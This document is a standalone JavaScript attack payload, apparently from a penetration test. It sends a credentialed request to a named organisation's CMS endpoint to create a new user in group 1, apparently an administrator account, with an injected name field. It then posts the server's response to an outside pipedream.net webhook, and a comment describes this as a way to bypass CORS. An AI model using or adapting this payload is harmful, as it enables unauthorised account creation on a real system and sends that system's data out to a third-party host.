fetch('https://cms.sipradi.com.np/Setup/Security/SaveUser', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryVAPT'
  },
  body: `------WebKitFormBoundaryVAPT
Content-Disposition: form-data; name="jsonData"

{"UserId":0,"GroupId":1,"FirstName":"XSS","LastName":"User","Designation":"Injected","UserName":"xss_>
------WebKitFormBoundaryVAPT--`
})
.then(res => res.text())
.then(responseText => {
  console.log(responseText);

  // Send response to webhook with no-cors mode to bypass CORS
  fetch('https://38e4abf20e4f806dfe0a3252fb581142.m.pipedream.net/creatuser=', {
    method: 'POST',
    mode: 'no-cors',  // <-- key to bypass CORS
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ message: responseText })
  });
})
.catch(console.error);




